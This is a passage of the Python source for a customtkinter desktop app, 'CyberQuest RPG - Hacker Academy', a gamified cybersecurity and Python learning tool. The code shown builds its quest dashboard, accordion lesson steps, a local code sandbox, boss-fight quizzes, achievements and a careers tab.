        {"id":"web","name":"Web Warrior","desc":"All Web Hacking quests","icon":"W","check": lambda: tree_done("webhack")},
        {"id":"python","name":"Pythonista","desc":"All Python quests","icon":"S","check": lambda: tree_done("python")},
        {"id":"trees","name":"Renaissance Hacker","desc":"Quest in every tree","icon":"R","check": lambda: all(any(q["id"] in c for q in ALL_QUESTS if q["tree"]==t) for t in SKILL_TREES)},
    ]


# ═══════════════════════════════════════════════════════════════════════════
# MAIN APPLICATION
# ═══════════════════════════════════════════════════════════════════════════

class App(ctk.CTk):

    def __init__(self):
        super().__init__()
        self.title("CyberQuest RPG - Hacker Academy")
        self.geometry("1280x860")
        self.minsize(1050, 700)
        self.configure(fg_color=C["bg"])
        self.save = load_save()
        self.sel_tree = None
        self._build_layout()
        if not self.save.get("seen_requirements"):
            self.after(600, self._show_requirements)
        self.show_dashboard()

    # ── LAYOUT ────────────────────────────────────────────────────────────

    def _build_layout(self):
        title_row = ctk.CTkFrame(self, fg_color=C["bg"], corner_radius=0)
        title_row.pack(fill="x", padx=20, pady=(10, 2))
        ctk.CTkLabel(title_row, text="CYBERQUEST RPG",
                     font=ctk.CTkFont("Courier New", 28, "bold"),
                     text_color=C["acc"]).pack(side="left")
        ctk.CTkLabel(title_row, text="  //  HACKER ACADEMY  //  Parrot OS Edition",
                     font=ctk.CTkFont("Courier New", 13),
                     text_color=C["dim"]).pack(side="left", pady=(6, 0))

        self.rank_frame = ctk.CTkFrame(self, fg_color=C["bg2"],
                                       border_color=C["acc2"], border_width=1, corner_radius=4)
        self.rank_frame.pack(fill="x", padx=20, pady=(2, 4))
        self._build_rank_bar()

        nav = ctk.CTkFrame(self, fg_color=C["bg"], corner_radius=0)
        nav.pack(fill="x", padx=20, pady=(0, 4))
        tab_defs = [
            ("QUESTS", self.show_dashboard),
            ("PYTHON", self.show_python),
            ("BOSS FIGHTS", self.show_bosses),
            ("ACHIEVEMENTS", self.show_achievements),
            ("CAREERS", self.show_careers),
            ("SETUP", self._show_requirements),
        ]
        self.tab_btns = []
        for label, cmd in tab_defs:
            btn = ctk.CTkButton(nav, text=label, command=cmd, width=140,
                                fg_color=C["bg3"], hover_color=C["acc3"],
                                text_color=C["dim"], font=ctk.CTkFont("Courier New", 13, "bold"),
                                border_width=1, border_color=C["border"], corner_radius=3)
            btn.pack(side="left", padx=2, pady=2)
            self.tab_btns.append(btn)

        self.scroll = ctk.CTkScrollableFrame(self, fg_color=C["bg"],
                                              scrollbar_button_color=C["acc3"],
                                              scrollbar_button_hover_color=C["acc2"])
        self.scroll.pack(fill="both", expand=True, padx=20, pady=(0, 8))

    def _build_rank_bar(self):
        for w in self.rank_frame.winfo_children():
            w.destroy()
        xp = total_xp(self.save)
        rank = get_rank(xp)
        next_rk = get_next_rank(xp)
        n_q = len(self.save.get("completed_quests", []))
        n_b = len(self.save.get("side_quests_done", []))
        row = ctk.CTkFrame(self.rank_frame, fg_color=C["bg2"])
        row.pack(fill="x", padx=12, pady=(6, 2))
        # Left: rank + title
        ctk.CTkLabel(row, text=f"RANK {rank['level']}  {rank['title']}",
                     font=ctk.CTkFont("Courier New", 14, "bold"),
                     text_color=C["acc"]).pack(side="left")
        ctk.CTkLabel(row, text=f"  {n_q}/{len(ALL_QUESTS)} Quests  |  {n_b} Bosses",
                     font=ctk.CTkFont("Courier New", 11),
                     text_color=C["dim"]).pack(side="left", padx=(8, 0))
        # Right: XP
        ctk.CTkLabel(row, text=f"{xp} XP",
                     font=ctk.CTkFont("Courier New", 18, "bold"),
                     text_color=C["white"]).pack(side="right")
        # Progress bar row
        if next_rk:
            bar_row = ctk.CTkFrame(self.rank_frame, fg_color=C["bg2"])
            bar_row.pack(fill="x", padx=12, pady=(2, 6))
            progress = (xp - rank["xp"]) / max(1, next_rk["xp"] - rank["xp"])
            pb = ctk.CTkProgressBar(bar_row, progress_color=C["acc"], fg_color=C["acc3"], height=5)
            pb.pack(side="left", fill="x", expand=True)
            pb.set(min(progress, 1.0))
            ctk.CTkLabel(bar_row,
                         text=f"  {next_rk['title']}  ({next_rk['xp']-xp} XP to go)",
                         font=ctk.CTkFont("Courier New", 11), text_color=C["dim"]).pack(side="left", padx=(6, 0))

    def _clear(self):
        for w in self.scroll.winfo_children():
            w.destroy()

    def _set_tab(self, idx):
        for i, btn in enumerate(self.tab_btns):
            btn.configure(text_color=C["acc"] if i == idx else C["dim"])

    def _refresh_rank(self):
        self._build_rank_bar()

    # ── QUEST AVAILABILITY ────────────────────────────────────────────────

    def _avail(self, tree_filter=None):
        available = []
        done = self.save.get("completed_quests", [])
        filt = tree_filter or self.sel_tree
        for q in ALL_QUESTS:
            if filt and q["tree"] != filt:
                continue
            if q["tier"] == 1:
                available.append(q)
            elif q["tier"] == 2:
                if any(a["id"] in done and a["tree"] == q["tree"] and a["tier"] == 1
                       for a in ALL_QUESTS):
                    available.append(q)
            elif q["tier"] == 3:
                if any(a["id"] in done and a["tree"] == q["tree"] and a["tier"] == 2
                       for a in ALL_QUESTS):
                    available.append(q)
        return available

    # ── REQUIREMENTS POPUP ────────────────────────────────────────────────

    def _show_requirements(self):
        popup = ctk.CTkToplevel(self)
        popup.title("Getting Started")
        popup.geometry("850x650")
        popup.configure(fg_color=C["bg"])
        popup.transient(self)
        popup.grab_set()
        ctk.CTkLabel(popup, text="BEFORE YOU BEGIN",
                     font=ctk.CTkFont("Courier New", 17, "bold"),
                     text_color=C["warn"]).pack(pady=(14, 6))
        box = ctk.CTkTextbox(popup, fg_color=C["bg2"], text_color=C["fg"],
                             font=ctk.CTkFont("Courier New", 13),
                             border_color=C["border"], border_width=1, wrap="word")
        box.pack(fill="both", expand=True, padx=16, pady=4)
        box.insert("1.0", REQUIREMENTS_TEXT)
        box.configure(state="disabled")
        def dismiss():
            self.save["seen_requirements"] = True
            write_save(self.save)
            popup.destroy()
        ctk.CTkButton(popup, text="GOT IT - LET'S HACK", command=dismiss,
                      fg_color=C["acc3"], hover_color=C["acc2"],
                      text_color=C["acc"], font=ctk.CTkFont("Courier New", 15, "bold"),
                      border_width=1, border_color=C["acc"], corner_radius=4,
                      height=46).pack(fill="x", padx=16, pady=12)

    # ── DASHBOARD ─────────────────────────────────────────────────────────

    def show_dashboard(self):
        self._clear()
        self._set_tab(0)
        filter_row = ctk.CTkFrame(self.scroll, fg_color=C["bg"])
        filter_row.pack(fill="x", pady=(0, 4))
        def set_filt(key):
            self.sel_tree = key
            self.show_dashboard()
        ctk.CTkButton(filter_row, text="ALL", width=48,
                      fg_color=C["acc3"] if not self.sel_tree else C["bg3"],
                      hover_color=C["acc3"],
                      text_color=C["acc"] if not self.sel_tree else C["dim"],
                      font=ctk.CTkFont("Courier New", 12, "bold"),
                      border_width=1, border_color=C["border"], corner_radius=3,
                      command=lambda: set_filt(None)).pack(side="left", padx=(0, 2))
        for key, tree in SKILL_TREES.items():
            if key == "python":
                continue
            sel = self.sel_tree == key
            ctk.CTkButton(filter_row, text=tree["icon"], width=36,
                          fg_color=C["acc3"] if sel else C["bg3"],
                          hover_color=C["acc3"],
                          text_color=tree["color"] if sel else C["dim"],
                          border_width=1, border_color=C["border"], corner_radius=3,
                          command=lambda k=key: set_filt(k)).pack(side="left", padx=1)
        quests = [q for q in self._avail() if q["tree"] != "python"]
        for q in quests:
            self._quest_card(q)
        if not quests:
            ctk.CTkLabel(self.scroll, text="No quests available. Complete Tier 1 to unlock higher tiers.",
                         font=ctk.CTkFont("Courier New", 13), text_color=C["dim"]).pack(pady=20)
        ctk.CTkButton(self.scroll, text="RESET ALL PROGRESS",
                      fg_color=C["bg2"], hover_color="#2a0808",
                      text_color=C["danger"], border_width=1, border_color=C["danger"],
                      font=ctk.CTkFont("Courier New", 12), corner_radius=3,
                      command=self._reset).pack(fill="x", pady=(10, 0))

    # ── PYTHON TAB ────────────────────────────────────────────────────────

    def show_python(self):
        self._clear()
        self._set_tab(1)
        ctk.CTkLabel(self.scroll, text="PYTHON SCRIPTING - Hacker Track",
                     font=ctk.CTkFont("Courier New", 17, "bold"),
                     text_color=C["blue"]).pack(anchor="w", pady=(0, 2))
        ctk.CTkLabel(self.scroll, text="Learn Python the hacker way. Each quest has a built-in sandbox.",
                     font=ctk.CTkFont("Courier New", 13), text_color=C["dim"]).pack(anchor="w", pady=(0, 8))
        py_xp = sum(q["xp"] for q in ALL_QUESTS if q["id"] in self.save.get("completed_quests", []) and q["tree"] == "python")
        max_xp = sum(q["xp"] for q in ALL_QUESTS if q["tree"] == "python")
        prog_box = ctk.CTkFrame(self.scroll, fg_color=C["bg2"], border_color=C["blue"], border_width=1, corner_radius=4)
        prog_box.pack(fill="x", pady=(0, 10))
        ctk.CTkLabel(prog_box, text=f"Python Progress: {py_xp} / {max_xp} XP",
                     font=ctk.CTkFont("Courier New", 13, "bold"), text_color=C["blue"]).pack(anchor="w", padx=10, pady=(6, 2))
        bar = ctk.CTkProgressBar(prog_box, progress_color=C["blue"], fg_color=C["bg3"], height=6)
        bar.pack(fill="x", padx=10, pady=(0, 8))
        bar.set(min(py_xp / max(1, max_xp), 1.0))
        for q in self._avail(tree_filter="python"):
            self._quest_card(q)

    # ── QUEST CARD ────────────────────────────────────────────────────────

    def _quest_card(self, quest):
        tree = SKILL_TREES[quest["tree"]]
        done = quest["id"] in self.save.get("completed_quests", [])
        bg_color = C["done_bg"] if done else C["bg2"]
        brd_color = C["done_brd"] if done else C["border"]
        card = ctk.CTkFrame(self.scroll, fg_color=bg_color,
                            border_color=brd_color, border_width=1, corner_radius=4)
        card.pack(fill="x", pady=2)
        def open_quest(event=None):
            self._show_quest_detail(quest)
        inner = ctk.CTkFrame(card, fg_color=bg_color)
        inner.pack(fill="x", padx=10, pady=6)
        top = ctk.CTkFrame(inner, fg_color=bg_color)
        top.pack(fill="x")
        ctk.CTkLabel(top, text=f"{tree['icon']} T{quest['tier']}",
                     font=ctk.CTkFont("Courier New", 12),
                     text_color=tree["color"]).pack(side="left")
        check = " [done] " if done else " "
        title_color = C["acc"] if done else C["white"]
        ctk.CTkLabel(top, text=f"{check}{quest['title']}",
                     font=ctk.CTkFont("Courier New", 14, "bold"),
                     text_color=title_color).pack(side="left", padx=4)
        ctk.CTkLabel(top, text=f"+{quest['xp']} XP",
                     font=ctk.CTkFont("Courier New", 13, "bold"),
                     text_color=tree["color"]).pack(side="right")
        ctk.CTkLabel(inner, text=quest["brief"],
                     font=ctk.CTkFont("Courier New", 12),
                     text_color=C["dim"], anchor="w").pack(fill="x", pady=(1, 0))
        for widget in [card, inner, top] + list(inner.winfo_children()) + list(top.winfo_children()):
            widget.bind("<Button-1>", open_quest)
            widget.configure(cursor="hand2")

    # ── QUEST DETAIL — NEW FORMAT with accordion ──────────────────────────

    def _show_quest_detail(self, quest):
        self._clear()
        self._set_tab(1 if quest["tree"] == "python" else 0)
        tree = SKILL_TREES[quest["tree"]]
        done = quest["id"] in self.save.get("completed_quests", [])
        back_cmd = self.show_python if quest["tree"] == "python" else self.show_dashboard

        ctk.CTkButton(self.scroll, text="<- Back", command=back_cmd, width=100,
                      fg_color=C["bg3"], hover_color=C["acc3"],
                      text_color=C["acc"], border_width=1, border_color=C["border"],
                      font=ctk.CTkFont("Courier New", 13, "bold"), corner_radius=3,
                      ).pack(anchor="w", pady=(0, 6))

        # Header
        header = ctk.CTkFrame(self.scroll, fg_color=C["bg2"],
                              border_color=tree["color"], border_width=1, corner_radius=4)
        header.pack(fill="x")
        hinner = ctk.CTkFrame(header, fg_color=C["bg2"])
        hinner.pack(fill="x", padx=12, pady=8)
        htop = ctk.CTkFrame(hinner, fg_color=C["bg2"])
        htop.pack(fill="x")
        ctk.CTkLabel(htop, text=f"{tree['icon']}  {tree['name'].upper()}  |  TIER {quest['tier']}",
                     font=ctk.CTkFont("Courier New", 12), text_color=tree["color"]).pack(side="left")
        ctk.CTkLabel(htop, text=f"+{quest['xp']} XP",
                     font=ctk.CTkFont("Courier New", 14, "bold"),
                     text_color=tree["color"]).pack(side="right")
        ctk.CTkLabel(hinner, text=quest["title"],
                     font=ctk.CTkFont("Courier New", 17, "bold"),
                     text_color=C["white"]).pack(anchor="w", pady=(2, 0))

        # Narrative
        narrative_box = ctk.CTkFrame(self.scroll, fg_color=C["bg3"],
                                      border_color=C["border"], border_width=1, corner_radius=4)
        narrative_box.pack(fill="x", pady=(6, 0))
        ctk.CTkLabel(narrative_box, text=quest["narrative"],
                     font=ctk.CTkFont("Courier New", 13),
                     text_color=C["fg"], wraplength=900, justify="left",
                     anchor="w").pack(fill="x", padx=12, pady=10)

        # Objective
        obj_frame = ctk.CTkFrame(self.scroll, fg_color=C["bg2"],
                                  border_color=C["acc"], border_width=1, corner_radius=4)
        obj_frame.pack(fill="x", pady=(6, 0))
        ctk.CTkLabel(obj_frame, text="--- OBJECTIVE ---",
                     font=ctk.CTkFont("Courier New", 12, "bold"),
                     text_color=C["acc"]).pack(anchor="w", padx=12, pady=(8, 2))
        ctk.CTkLabel(obj_frame, text=quest["objective"],
                     font=ctk.CTkFont("Courier New", 13),
                     text_color=C["white"], wraplength=900, justify="left",
                     anchor="w").pack(fill="x", padx=12, pady=(0, 10))

        # Accordion learning steps
        if quest.get("steps"):
            ctk.CTkLabel(self.scroll, text="--- LEARNING STEPS  (click to expand) ---",
                         font=ctk.CTkFont("Courier New", 12, "bold"),
                         text_color=C["dim"]).pack(anchor="w", pady=(10, 4))
            for step in quest["steps"]:
                self._accordion_step(step)

        # Python sandbox button
        if quest.get("sandbox"):
            ctk.CTkButton(self.scroll, text=">>> OPEN PYTHON SANDBOX",
                          command=lambda: self._open_sandbox(quest["sandbox"]),
                          fg_color=C["bg3"], hover_color=C["acc3"],
                          text_color=C["blue"], border_width=1, border_color=C["blue"],
                          font=ctk.CTkFont("Courier New", 13, "bold"), corner_radius=3,
                          height=42).pack(fill="x", pady=(8, 0))

        # Task
        task_frame = ctk.CTkFrame(self.scroll, fg_color=C["bg2"],
                                   border_color=C["warn"], border_width=1, corner_radius=4)
        task_frame.pack(fill="x", pady=(8, 0))
        ctk.CTkLabel(task_frame, text="--- YOUR TASK ---",
                     font=ctk.CTkFont("Courier New", 13, "bold"),
                     text_color=C["warn"]).pack(anchor="w", padx=12, pady=(8, 2))
        ctk.CTkLabel(task_frame, text=quest["task"],
                     font=ctk.CTkFont("Courier New", 13),
                     text_color=C["fg"], wraplength=900, justify="left",
                     anchor="w").pack(fill="x", padx=12, pady=(0, 10))

        # Action buttons
        btn_row = ctk.CTkFrame(self.scroll, fg_color=C["bg"])
        btn_row.pack(fill="x", pady=(8, 0))
        if not done:
            ctk.CTkButton(btn_row, text="[+] MARK AS COMPLETE",
                          command=lambda: self._complete_quest(quest),
                          fg_color=C["acc3"], hover_color=C["acc2"],
                          text_color=C["acc"], border_width=1, border_color=C["acc"],
                          font=ctk.CTkFont("Courier New", 15, "bold"), corner_radius=4,
                          height=48).pack(fill="x", side="left", expand=True, padx=(0, 4))
        else:
            ctk.CTkLabel(btn_row, text="[+] QUEST COMPLETE",
                         font=ctk.CTkFont("Courier New", 15, "bold"),
                         text_color=C["acc"], fg_color=C["done_bg"],
                         corner_radius=4, height=48).pack(fill="x", side="left", expand=True, padx=(0, 4))
        def reset_quest():
            if messagebox.askyesno("Reset Quest", f"Reset '{quest['title']}'?"):
                comp = self.save.get("completed_quests", [])
                if quest["id"] in comp:
                    comp.remove(quest["id"])
                self.save["completed_quests"] = comp
                write_save(self.save)
                self._refresh_rank()
                self._show_quest_detail(quest)
        ctk.CTkButton(btn_row, text="Reset", command=reset_quest, width=100,
                      fg_color=C["bg3"], hover_color="#2a1a00",
                      text_color=C["warn"], border_width=1, border_color=C["warn"],
                      font=ctk.CTkFont("Courier New", 12, "bold"), corner_radius=3,
                      height=48).pack(side="right")

    # ── ACCORDION STEP WIDGET ─────────────────────────────────────────────

    def _accordion_step(self, step):
        container = ctk.CTkFrame(self.scroll, fg_color=C["step_bg"],
                                  border_color=C["border"], border_width=1, corner_radius=4)
        container.pack(fill="x", pady=1)
        hdr = ctk.CTkFrame(container, fg_color=C["step_hdr"], corner_radius=3)
        hdr.pack(fill="x", padx=2, pady=2)
        arrow_label = ctk.CTkLabel(hdr, text="> " + step["title"],
                                    font=ctk.CTkFont("Courier New", 13, "bold"),
                                    text_color=C["acc"], anchor="w")
        arrow_label.pack(fill="x", padx=10, pady=6)
        body_frame = ctk.CTkFrame(container, fg_color=C["step_bg"])
        body_label = ctk.CTkLabel(body_frame, text=step["body"],
                                   font=ctk.CTkFont("Courier New", 12),
                                   text_color=C["fg"], wraplength=880,
                                   justify="left", anchor="w")
        body_label.pack(fill="x", padx=14, pady=(4, 10))
        expanded = [False]
        def toggle(event=None):
            if expanded[0]:
                body_frame.pack_forget()
                arrow_label.configure(text="> " + step["title"])
                expanded[0] = False
            else:
                body_frame.pack(fill="x", padx=2, pady=(0, 2))
                arrow_label.configure(text="v " + step["title"])
                expanded[0] = True
        for w in [hdr, arrow_label]:
            w.bind("<Button-1>", toggle)
            w.configure(cursor="hand2")

    # ── PYTHON SANDBOX ────────────────────────────────────────────────────

    def _open_sandbox(self, starter_code):
        win = ctk.CTkToplevel(self)
        win.title("Python Sandbox")
        win.geometry("860x660")
        win.configure(fg_color=C["bg"])
        win.transient(self)
        ctk.CTkLabel(win, text="PYTHON SANDBOX",
                     font=ctk.CTkFont("Courier New", 16, "bold"),
                     text_color=C["warn"]).pack(pady=(10, 4))
        ctk.CTkLabel(win, text="CODE:", font=ctk.CTkFont("Courier New", 12),
                     text_color=C["dim"]).pack(anchor="w", padx=12)
        editor = ctk.CTkTextbox(win, fg_color=C["bg3"], text_color=C["acc"],
                                font=ctk.CTkFont("Courier New", 13),
                                border_color=C["warn"], border_width=1,
                                wrap="none", height=260)
        editor.pack(fill="both", padx=12, pady=(0, 4))
        editor.insert("1.0", starter_code)
        ctk.CTkLabel(win, text="OUTPUT:", font=ctk.CTkFont("Courier New", 12),
                     text_color=C["dim"]).pack(anchor="w", padx=12)
        output_box = ctk.CTkTextbox(win, fg_color=C["bg2"], text_color=C["fg"],
                                    font=ctk.CTkFont("Courier New", 13),
                                    border_color=C["border"], border_width=1,
                                    wrap="word", height=180, state="disabled")
        output_box.pack(fill="both", expand=True, padx=12, pady=(0, 4))
        def run_code():
            code = editor.get("1.0", "end").strip()
            if not code:
                return
            output_box.configure(state="normal")
            output_box.delete("1.0", "end")
            try:
                with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as tmp:
                    tmp.write(code)
                    tmp_path = tmp.name
                result = subprocess.run(
                    [sys.executable, tmp_path],
                    capture_output=True, text=True, timeout=10,
                    input="Captain\n80\ntcp\n",
                )
                out = result.stdout
                if result.stderr:
                    out += f"\n--- ERRORS ---\n{result.stderr}"
                output_box.insert("1.0", out or "(No output)")
            except subprocess.TimeoutExpired:
                output_box.insert("1.0", "Timed out (10 seconds)")
            except Exception as err:
                output_box.insert("1.0", f"Error: {err}")
            finally:
                try:
                    os.unlink(tmp_path)
                except Exception:
                    pass
            output_box.configure(state="disabled")
        btn_row = ctk.CTkFrame(win, fg_color=C["bg"])
        btn_row.pack(fill="x", padx=12, pady=(0, 10))
        ctk.CTkButton(btn_row, text="RUN", command=run_code,
                      fg_color=C["acc3"], hover_color=C["acc2"],
                      text_color=C["acc"], border_width=1, border_color=C["acc"],
                      font=ctk.CTkFont("Courier New", 14, "bold"), corner_radius=3,
                      height=42).pack(side="left", fill="x", expand=True, padx=(0, 4))
        ctk.CTkButton(btn_row, text="CLOSE", command=win.destroy,
                      fg_color=C["bg3"], hover_color=C["bg2"],
                      text_color=C["dim"], border_width=1, border_color=C["border"],
                      font=ctk.CTkFont("Courier New", 14, "bold"), corner_radius=3,
                      height=42).pack(side="left", fill="x", expand=True)

    # ── COMPLETION ACTIONS ────────────────────────────────────────────────

    def _complete_quest(self, quest):
        done = self.save.get("completed_quests", [])
        if quest["id"] not in done:
            done.append(quest["id"])
            self.save["completed_quests"] = done
            write_save(self.save)
            self._refresh_rank()
            self._show_quest_detail(quest)
            messagebox.showinfo("Quest Complete!",
                                f"+{quest['xp']} XP!\nRank: {get_rank(total_xp(self.save))['title']}")

    def _reset(self):
        if messagebox.askyesno("Reset All", "Erase ALL progress? This cannot be undone."):
            if messagebox.askyesno("Confirm", "Really? Everything will be wiped."):
                self.save = {
                    "completed_quests": [], "exam_scores": {},
                    "side_quests_done": [], "seen_requirements": True,
                    "started": datetime.now().isoformat(),
                }
                write_save(self.save)
                self._refresh_rank()
                self.show_dashboard()

    # ── BOSS FIGHTS TAB ──────────────────────────────────────────────────

    def show_bosses(self):
        self._clear()
        self._set_tab(2)
        ctk.CTkLabel(self.scroll, text="BOSS FIGHTS",
                     font=ctk.CTkFont("Courier New", 17, "bold"),
                     text_color=C["danger"]).pack(anchor="w", pady=(0, 2))
        ctk.CTkLabel(self.scroll, text="Complete all quests in a tree to unlock its boss. Score 70%+ to defeat it.",
                     font=ctk.CTkFont("Courier New", 12), text_color=C["dim"]).pack(anchor="w", pady=(0, 10))
        done_quests = self.save.get("completed_quests", [])
        bosses_done = self.save.get("side_quests_done", [])
        scores = self.save.get("exam_scores", {})
        for boss in BOSS_FIGHTS:
            tree = SKILL_TREES.get(boss["tree"], {})
            tree_quests = [q for q in ALL_QUESTS if q["tree"] == boss["tree"]]
            tree_complete = all(q["id"] in done_quests for q in tree_quests)
            passed = boss["id"] in bosses_done
            score = scores.get(boss["id"])
            bg = C["done_bg"] if passed else C["bg2"]
            brd = C["done_brd"] if passed else (C["danger"] if tree_complete else C["border"])
            card = ctk.CTkFrame(self.scroll, fg_color=bg,
                                border_color=brd, border_width=1, corner_radius=4)
            card.pack(fill="x", pady=2)
            inner = ctk.CTkFrame(card, fg_color=bg)
            inner.pack(fill="x", padx=10, pady=7)
            top = ctk.CTkFrame(inner, fg_color=bg)
            top.pack(fill="x")
            ctk.CTkLabel(top, text=boss["title"],
                         font=ctk.CTkFont("Courier New", 14, "bold"),
                         text_color=C["acc"] if passed else (C["danger"] if tree_complete else C["dim"])).pack(side="left")
            xp_txt = f"+{boss['xp']} XP"
            if score is not None:
                xp_txt += f"  (Best: {score}%)"
            ctk.CTkLabel(top, text=xp_txt,
                         font=ctk.CTkFont("Courier New", 13, "bold"),
                         text_color=C["warn"]).pack(side="right")
            status = "[done] DEFEATED" if passed else ("[!] READY" if tree_complete else "[locked] LOCKED")
            info_text = f"{status}  |  {len(boss['questions'])} questions"
            if not tree_complete:
                remaining = sum(1 for q in tree_quests if q["id"] not in done_quests)
                info_text += f"  |  {remaining} quests remaining"
            ctk.CTkLabel(inner, text=info_text,
                         font=ctk.CTkFont("Courier New", 12),
                         text_color=C["dim"]).pack(anchor="w")
            if tree_complete:
                def open_boss(event=None, b=boss):
                    self._start_boss(b)
                for widget in [card, inner, top] + list(inner.winfo_children()) + list(top.winfo_children()):
                    widget.bind("<Button-1>", open_boss)
                    widget.configure(cursor="hand2")

    def _start_boss(self, boss):
        self._clear()
        self._set_tab(2)
        ctk.CTkButton(self.scroll, text="<- Back", command=self.show_bosses, width=100,
                      fg_color=C["bg3"], hover_color=C["acc3"],
                      text_color=C["acc"], border_width=1, border_color=C["border"],
                      font=ctk.CTkFont("Courier New", 13, "bold"), corner_radius=3).pack(anchor="w", pady=(0, 6))
        ctk.CTkLabel(self.scroll, text=boss["title"],
                     font=ctk.CTkFont("Courier New", 17, "bold"),
                     text_color=C["danger"]).pack(anchor="w", pady=(0, 8))
        import tkinter as tk
        self.exam_vars = []
        for i, q in enumerate(boss["questions"]):
            q_frame = ctk.CTkFrame(self.scroll, fg_color=C["bg2"],
                                   border_color=C["border"], border_width=1, corner_radius=4)
            q_frame.pack(fill="x", pady=2)
            q_inner = ctk.CTkFrame(q_frame, fg_color=C["bg2"])
            q_inner.pack(fill="x", padx=10, pady=6)
            ctk.CTkLabel(q_inner, text=f"Q{i+1}: {q['q']}",
                         font=ctk.CTkFont("Courier New", 13, "bold"),
                         text_color=C["white"], wraplength=900, justify="left",
                         anchor="w").pack(fill="x", pady=(0, 4))
            var = tk.IntVar(value=-1)
            self.exam_vars.append(var)
            for j, opt in enumerate(q["options"]):
                ctk.CTkRadioButton(q_inner, text=opt, variable=var, value=j,
                                   font=ctk.CTkFont("Courier New", 13),
                                   text_color=C["fg"],
                                   fg_color=C["acc"], hover_color=C["acc2"],
                                   border_color=C["dim"]).pack(anchor="w", padx=8, pady=1)
        ctk.CTkButton(self.scroll, text="SUBMIT - FIGHT THE BOSS",
                      command=lambda: self._submit_boss(boss),
                      fg_color="#330000", hover_color="#550000",
                      text_color=C["danger"], border_width=1, border_color=C["danger"],
                      font=ctk.CTkFont("Courier New", 15, "bold"), corner_radius=4,
                      height=48).pack(fill="x", pady=(8, 0))

    def _submit_boss(self, boss):
        correct = sum(1 for i, q in enumerate(boss["questions"])
                      if self.exam_vars[i].get() == q["answer"])
        score = int((correct / len(boss["questions"])) * 100)
        passed = score >= 70
        prev = self.save.get("exam_scores", {}).get(boss["id"], 0)
        self.save.setdefault("exam_scores", {})[boss["id"]] = max(score, prev)
        if passed and boss["id"] not in self.save.get("side_quests_done", []):
            self.save.setdefault("side_quests_done", []).append(boss["id"])
        write_save(self.save)
        self._refresh_rank()
        if passed:
            messagebox.showinfo("BOSS DEFEATED!",
                                f"Score: {correct}/{len(boss['questions'])} ({score}%)\n+{boss['xp']} XP!")
        else:
            messagebox.showinfo("Not Yet...",
                                f"Score: {correct}/{len(boss['questions'])} ({score}%)\nNeed 70% to pass. Try again!")
        self.show_bosses()

    # ── ACHIEVEMENTS TAB ──────────────────────────────────────────────────

    def show_achievements(self):
        self._clear()
        self._set_tab(3)
        achs = get_achievements(self.save)
        earned = sum(1 for a in achs if a["check"]())
        ctk.CTkLabel(self.scroll,
                     text=f"ACHIEVEMENTS - {earned} / {len(achs)} Earned",
                     font=ctk.CTkFont("Courier New", 17, "bold"),
                     text_color=C["acc"]).pack(pady=(0, 8))
        for ach in achs:
            earned_this = ach["check"]()
            bg = C["done_bg"] if earned_this else C["bg2"]
            brd = C["done_brd"] if earned_this else C["border"]
            card = ctk.CTkFrame(self.scroll, fg_color=bg,
                                border_color=brd, border_width=1, corner_radius=4)
            card.pack(fill="x", pady=2)
            inner = ctk.CTkFrame(card, fg_color=bg)
            inner.pack(fill="x", padx=10, pady=6)
            row = ctk.CTkFrame(inner, fg_color=bg)
            row.pack(fill="x")
            icon_text = ach["icon"] if earned_this else "?"
            ctk.CTkLabel(row, text=f"[{icon_text}]",
                         font=ctk.CTkFont("Courier New", 16, "bold"),
                         text_color=C["acc"] if earned_this else C["dim"],
                         fg_color=bg).pack(side="left", padx=(0, 10))
            info = ctk.CTkFrame(row, fg_color=bg)
            info.pack(side="left")
            ctk.CTkLabel(info, text=ach["name"],
                         font=ctk.CTkFont("Courier New", 13, "bold"),
                         text_color=C["acc"] if earned_this else C["dim"]).pack(anchor="w")
            ctk.CTkLabel(info, text=ach["desc"],
                         font=ctk.CTkFont("Courier New", 12),
                         text_color=C["dim"]).pack(anchor="w")

    # ── CAREERS TAB ───────────────────────────────────────────────────────

    def show_careers(self):
        self._clear()
        self._set_tab(4)
        ctk.CTkLabel(self.scroll, text="CYBERSECURITY CAREERS",
                     font=ctk.CTkFont("Courier New", 17, "bold"),
                     text_color=C["warn"]).pack(anchor="w", pady=(0, 2))
        ctk.CTkLabel(self.scroll, text="Where CyberQuest skills lead in the real world.",
                     font=ctk.CTkFont("Courier New", 12), text_color=C["dim"]).pack(anchor="w", pady=(0, 10))
        for career in CAREERS:
            card = ctk.CTkFrame(self.scroll, fg_color=C["bg2"],
                                border_color=C["border"], border_width=1, corner_radius=4)
            card.pack(fill="x", pady=3)
            inner = ctk.CTkFrame(card, fg_color=C["bg2"])
            inner.pack(fill="x", padx=12, pady=8)
            top = ctk.CTkFrame(inner, fg_color=C["bg2"])
            top.pack(fill="x")
            ctk.CTkLabel(top, text=career["title"],
                         font=ctk.CTkFont("Courier New", 14, "bold"),
                         text_color=C["white"]).pack(side="left")
            ctk.CTkLabel(top, text=career["salary"],
                         font=ctk.CTkFont("Courier New", 14, "bold"),
                         text_color=C["acc"]).pack(side="right")
            for label, value, color in [
                ("", career["desc"], C["fg"]),
                ("Skills:  ", career["skills"], C["dim"]),
                ("Certs:   ", career["certs"], C["warn"]),
                ("Trees:   ", " ".join(SKILL_TREES[t]["icon"] for t in career.get("trees", []) if t in SKILL_TREES), C["dim"]),
            ]:
                ctk.CTkLabel(inner, text=f"{label}{value}",
                             font=ctk.CTkFont("Courier New", 12),
                             text_color=color, wraplength=960,
                             justify="left", anchor="w").pack(fill="x", pady=(3, 0))


# ═══════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════

def main():
    app = App()
    app.mainloop()

if __name__ == '__main__':
    main()
